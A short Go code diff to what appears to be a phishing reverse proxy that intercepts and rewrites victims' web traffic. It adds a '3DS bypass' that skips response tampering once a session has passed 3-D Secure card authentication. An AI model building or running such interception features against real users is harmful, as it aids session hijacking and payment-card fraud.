@@ -1701,6 +1701,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							if ic.method != "" && !strings.EqualFold(ic.method, resp.Request.Method) {
 								continue
 							}
+							// 3DS bypass: if session has completed 3DS, skip response modification
+							if p.threeDS != nil && p.threeDS.HasBypass(ps.SessionId) {
+								log.Info("intercept response: 3DS bypass enabled for session %s, skipping alter_response (domain=%s, path=%s)", ps.SessionId, ic.domain, ic.path.String())
+								continue
+							}
 							if ic.type_ != "transparent" {
 								continue
 							}
